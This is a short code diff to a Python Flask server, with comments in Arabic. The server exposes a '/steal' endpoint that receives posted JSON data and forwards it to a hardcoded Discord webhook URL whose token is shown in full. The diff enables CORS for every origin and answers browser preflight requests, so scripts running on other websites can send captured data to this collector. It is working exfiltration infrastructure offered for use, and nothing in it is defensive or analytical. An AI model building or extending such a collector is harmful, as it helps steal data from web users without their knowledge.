@@ -1,4 +1,5 @@
 from flask import Flask, request
+from flask_cors import CORS  # <-- إضافة مكتبة CORS
 import requests
 import json
 import os
@@ -6,6 +7,7 @@ import re
 from datetime import datetime
 
 app = Flask(__name__)
+CORS(app)  # <-- تفعيل CORS لكل الطلبات
 
 # ===== ويب هوك ديسكورد =====
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532217110254850159/tIIeGy0xULqA0yPxSOt4YjC3MuV1Y8QOTtUwcly25hV8oG5O4VJLM1AEMu7OKRT9UpIl"
@@ -18,8 +20,11 @@ def send_to_discord(message):
     except Exception as e:
         print(f"Error sending to Discord: {e}")
 
-@app.route('/steal', methods=['POST'])
+@app.route('/steal', methods=['POST', 'OPTIONS'])  # <-- إضافة OPTIONS لـ preflight
 def steal():
+    if request.method == 'OPTIONS':
+        return '', 200  # الرد على طلب ما قبل الإرسال
+
     try:
         data = request.get_json()
         if not data:
